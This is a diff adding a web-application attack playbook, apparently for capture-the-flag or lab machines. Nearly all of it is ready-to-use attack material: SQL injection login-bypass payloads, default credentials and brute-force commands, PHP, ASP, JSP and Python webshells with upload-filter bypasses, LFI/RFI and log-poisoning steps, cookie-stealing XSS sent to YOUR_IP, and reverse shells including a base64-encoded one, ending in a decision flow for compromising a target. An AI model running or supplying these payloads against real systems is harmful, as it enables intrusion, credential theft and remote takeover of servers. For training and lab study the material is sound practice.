@@ -1,0 +1,416 @@
+# =============================================================================
+# INITIAL RECONNAISSANCE (ALWAYS START HERE)
+# =============================================================================
+
+# Basic enumeration
+nmap -sC -sV -oA initial_scan target_ip
+whatweb http://target_ip
+dirb http://target_ip
+gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt
+curl -s http://target_ip/robots.txt
+curl -s http://target_ip/sitemap.xml
+
+# Identify application structure
+curl -s http://target_ip | grep -i "form\|input\|login\|admin\|upload"
+
+# =============================================================================
+# SCENARIO A: LOGIN FORM FOUND
+# =============================================================================
+
+# A.1: SQL INJECTION IN LOGIN (HIGHEST PRIORITY)
+# Basic login bypass payloads:
+username: admin' OR '1'='1' --
+password: anything
+
+username: admin'--
+password: anything
+
+username: ' OR 1=1 --
+password: anything
+
+username: admin
+password: ' OR '1'='1' --
+
+# Union-based SQL injection:
+username: admin' UNION SELECT 1,2,3 --
+username: admin' UNION SELECT username,password FROM users --
+username: admin' UNION SELECT username,password FROM admin --
+
+# Time-based SQL injection:
+username: admin'; WAITFOR DELAY '00:00:05' --
+username: admin' AND SLEEP(5) --
+
+# PostgreSQL specific:
+username: admin'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php' --
+
+# Automated SQL injection:
+sqlmap -u "http://target_ip/login" --data="username=admin&password=test" --batch
+sqlmap -u "http://target_ip/login" --data="username=admin&password=test" --dbs
+sqlmap -u "http://target_ip/login" --data="username=admin&password=test" --os-shell
+
+# A.2: DEFAULT CREDENTIALS (IF SQL INJECTION FAILS)
+admin:admin
+admin:password
+administrator:administrator
+root:root
+guest:guest
+test:test
+demo:demo
+user:user
+admin123:admin123
+admin:123456
+
+# A.3: AUTHENTICATION BYPASS TECHNIQUES
+# Parameter manipulation:
+username=admin&password=anything&role=admin
+username[]=admin&password[]=test
+username=admin&password=&admin=1
+username=admin&password=%00
+
+# Logic bypass:
+username=admin&password=anything' OR '1'='1
+username=admin&password=&submit=login
+
+# A.4: BRUTE FORCE (LAST RESORT FOR LOGIN)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+wfuzz -w /usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" --hs "Invalid" http://target_ip/login
+
+# =============================================================================
+# SCENARIO A - POST LOGIN SUCCESS: ADMIN PANEL ACCESS
+# =============================================================================
+
+# A.5: FILE UPLOAD EXPLOITATION (IN ADMIN PANEL)
+# PHP webshells:
+<?php system($_GET['cmd']); ?>
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+# Upload bypasses:
+shell.php
+shell.php.jpg
+shell.pHP
+shell.php%00.jpg
+shell.php;.jpg
+shell.txt (then rename via LFI)
+
+# A.6: ADMIN PANEL COMMAND EXECUTION
+# Look for system administration features:
+# - File manager
+# - Database management
+# - System information
+# - Log viewer
+# - Configuration editor
+
+# Test for command injection in admin features:
+; id
+| id
+& id
+&& id
+|| id
+` id `
+$( id )
+
+# A.7: DATABASE ACCESS FROM ADMIN PANEL
+# If database management interface exists:
+SELECT * FROM users;
+SELECT * FROM admin;
+SHOW DATABASES;
+SHOW TABLES;
+SELECT LOAD_FILE('/etc/passwd');
+
+# =============================================================================
+# SCENARIO B: NO LOGIN FORM - INPUT FIELDS FOUND
+# =============================================================================
+
+# B.1: SEARCH FUNCTIONALITY EXPLOITATION
+# SQL injection in search:
+search_term: ' OR '1'='1' --
+search_term: ' UNION SELECT 1,2,3 --
+search_term: ' UNION SELECT username,password FROM users --
+
+# Command injection in search:
+search_term: test; id
+search_term: test | whoami
+search_term: test && uname -a
+
+# XSS in search (if results displayed):
+search_term: <script>alert('XSS')</script>
+search_term: <img src=x onerror=alert('XSS')>
+
+# B.2: CONTACT/FEEDBACK FORM EXPLOITATION
+# Command injection:
+name: test; id
+email: test@test.com
+message: test | whoami
+
+# XSS (if admin reviews):
+name: <script>document.location='http://YOUR_IP:8000/cookie='+document.cookie</script>
+message: <img src=x onerror=fetch('http://YOUR_IP:8000/'+document.cookie)>
+
+# B.3: URL PARAMETER EXPLOITATION
+# Test all URL parameters:
+http://target_ip/page?id=1
+http://target_ip/search?q=test
+http://target_ip/view?file=index.php
+
+# SQL injection in parameters:
+?id=1' OR '1'='1' --
+?id=1 UNION SELECT 1,2,3 --
+?q=' UNION SELECT username,password FROM users --
+
+# LFI in parameters:
+?file=../../../etc/passwd
+?include=....//....//etc/passwd
+?page=....\/....\/....\/etc/passwd
+
+# Command injection in parameters:
+?cmd=id
+?exec=whoami
+?system=uname -a
+
+# B.4: FILE PARAMETER EXPLOITATION
+# Local File Inclusion:
+?file=../../../etc/passwd
+?include=../../../var/log/apache2/access.log
+?page=....//....//....//etc/passwd
+?document=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Log poisoning for RCE:
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target_ip
+http://target_ip/page?file=../../../var/log/apache2/access.log&cmd=id
+
+# Remote File Inclusion:
+echo '<?php system($_GET["cmd"]); ?>' > shell.txt
+python3 -m http.server 8000
+?file=http://YOUR_IP:8000/shell.txt
+?include=http://YOUR_IP:8000/shell.txt&cmd=whoami
+
+# =============================================================================
+# SCENARIO C: NO LOGIN, NO OBVIOUS INPUT FIELDS
+# =============================================================================
+
+# C.1: HIDDEN PARAMETER DISCOVERY
+wfuzz -fc 404 -w parameters.txt http://target_ip/FUZZ
+wfuzz -fc 404 -w parameters.txt http://target_ip/?FUZZ=test
+wfuzz -fc 404 -d "FUZZ=test" http://target_ip/
+wfuzz -fc 404 -H "FUZZ: test" http://target_ip/
+
+# Common parameters to test:
+?debug=1
+?admin=1
+?test=1
+?dev=1
+?id=1
+?file=test
+?page=home
+?include=index
+?cmd=whoami
+
+# C.2: DIRECTORY TRAVERSAL EXPLOITATION
+# Test common vulnerable parameters:
+?file=../../../etc/passwd
+?include=....//....//etc/passwd
+?page=....\/....\/....\/etc/passwd
+?doc=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# C.3: DIRECT ADMIN ACCESS ATTEMPTS
+# Test common admin paths:
+/admin/
+/administrator/
+/admin/login.php
+/admin/index.php
+/dashboard/
+/control/
+/manage/
+/backend/
+/cpanel/
+
+# HTTP method bypass:
+curl -X POST http://target_ip/admin
+curl -X PUT http://target_ip/admin
+curl -H "X-HTTP-Method-Override: GET" -X POST http://target_ip/admin
+
+# Header manipulation:
+curl -H "X-Forwarded-For: 127.0.0.1" http://target_ip/admin
+curl -H "X-Real-IP: 127.0.0.1" http://target_ip/admin
+curl -H "Host: localhost" http://target_ip/admin
+
+# C.4: FILE DISCOVERY AND ACCESS
+# Look for sensitive files:
+/config.php
+/configuration.php
+/settings.php
+/.env
+/database.php
+/connect.php
+/admin/config.php
+/includes/config.php
+/wp-config.php
+/local.txt
+/flag.txt
+
+# Backup file discovery:
+/index.php.bak
+/config.php.backup
+/database.sql
+/backup.zip
+/site.tar.gz
+
+# =============================================================================
+# SCENARIO D: FILE UPLOAD FUNCTIONALITY FOUND (ANY SCENARIO)
+# =============================================================================
+
+# D.1: PHP WEBSHELL UPLOAD
+# Basic webshell:
+<?php system($_GET['cmd']); ?>
+
+# Advanced webshell:
+<?php 
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    echo shell_exec($_REQUEST['cmd']);
+    echo "</pre>";
+}
+echo "<form method=GET><input name=cmd placeholder='Command'><input type=submit></form>";
+?>
+
+# D.2: UPLOAD BYPASS TECHNIQUES
+# Extension bypasses:
+shell.php
+shell.php.jpg
+shell.pHP
+shell.Php
+shell.php%00.jpg
+shell.php;.jpg
+shell.php%20
+shell.php%0a
+shell.php.txt
+
+# Content-Type bypasses:
+Content-Type: image/jpeg (for PHP file)
+Content-Type: image/png (for PHP file)
+Content-Type: text/plain (for PHP file)
+
+# Magic byte bypass:
+GIF89a<?php system($_GET['cmd']); ?>
+
+# D.3: ALTERNATIVE SHELL FORMATS
+# ASP webshell:
+<%eval request("cmd")%>
+
+# JSP webshell:
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+
+# Python webshell:
+#!/usr/bin/env python3
+import cgi, subprocess
+print("Content-Type: text/html\n")
+form = cgi.FieldStorage()
+cmd = form.getvalue("cmd", "")
+if cmd: print(subprocess.getoutput(cmd))
+
+# =============================================================================
+# POST-EXPLOITATION (ANY SCENARIO SUCCESS)
+# =============================================================================
+
+# E.1: WEBSHELL ACCESS
+http://target_ip/shell.php?cmd=whoami
+http://target_ip/shell.php?cmd=id
+http://target_ip/shell.php?cmd=uname -a
+http://target_ip/shell.php?cmd=cat /etc/passwd
+
+# E.2: REVERSE SHELL ESTABLISHMENT
+# Bash reverse shell:
+bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
+
+# Python reverse shell:
+python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+
+# Netcat reverse shell:
+nc -e /bin/bash YOUR_IP 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
+
+# Base64 encoded (to avoid special characters):
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQLzQ0NDQgMD4mMQo= | base64 -d | bash
+
+# E.3: FLAG DISCOVERY
+find / -name "local.txt" 2>/dev/null
+find / -name "flag.txt" 2>/dev/null
+find / -name "user.txt" 2>/dev/null
+find / -name "root.txt" 2>/dev/null
+find / -name "*.txt" -path "*/home/*" 2>/dev/null
+find / -name "*.txt" -path "*/root/*" 2>/dev/null
+grep -r "flag{" / 2>/dev/null
+grep -r "CTF{" / 2>/dev/null
+
+# Common flag locations:
+cat /home/*/local.txt
+cat /home/*/user.txt
+cat /root/root.txt
+cat /var/www/html/flag.txt
+cat /tmp/flag.txt
+cat /opt/flag.txt
+
+# E.4: SYSTEM INFORMATION GATHERING
+whoami
+id
+uname -a
+cat /etc/passwd
+cat /etc/issue
+ls -la /home/
+ls -la /root/
+ps aux
+netstat -tulpn
+
+# E.5: PRIVILEGE ESCALATION (IF NEEDED)
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+find / -writable -type f 2>/dev/null | grep -v proc
+cat /etc/crontab
+ls -la /etc/cron*
+
+# =============================================================================
+# LISTENER SETUP
+# =============================================================================
+
+# Netcat listener:
+nc -lvnp 4444
+
+# Python HTTP server (for file hosting):
+python3 -m http.server 8000
+
+# =============================================================================
+# DECISION FLOW SUMMARY
+# =============================================================================
+
+# START -> Basic Recon
+#   |
+#   ├─ LOGIN FOUND? 
+#   │   └─ YES -> Scenario A (SQL Injection -> Default Creds -> Auth Bypass -> Brute Force)
+#   │       └─ SUCCESS -> Admin Panel -> File Upload/Command Injection
+#   │
+#   ├─ INPUT FIELDS FOUND?
+#   │   └─ YES -> Scenario B (Search SQLi -> Contact Form -> URL Parameters -> LFI/RFI)
+#   │
+#   ├─ NO OBVIOUS INPUTS?
+#   │   └─ YES -> Scenario C (Parameter Discovery -> Directory Traversal -> Admin Access -> File Discovery)
+#   │
+#   └─ FILE UPLOAD FOUND? (Any Scenario)
+#       └─ YES -> Scenario D (Webshell Upload -> Bypass Techniques)
+#
+# ANY SUCCESS -> Post-Exploitation (Webshell -> Reverse Shell -> Flag Discovery)
+
+# =============================================================================
+# TROUBLESHOOTING TIPS
+# =============================================================================
+
+# If nothing works:
+# 1. Try different encodings (URL, Base64, Hex)
+# 2. Test with different HTTP methods (POST, PUT, PATCH)
+# 3. Try case variations (Admin, ADMIN, aDmIn)
+# 4. Check for hidden form fields in HTML source
+# 5. Test with different User-Agents
+# 6. Try subdomain enumeration
+# 7. Check for alternative ports
+# 8. Look for client-side code (JavaScript) for API endpoints
+# 9. Try different wordlists for directory/file discovery
+# 10. Check for cookies that might indicate admin access
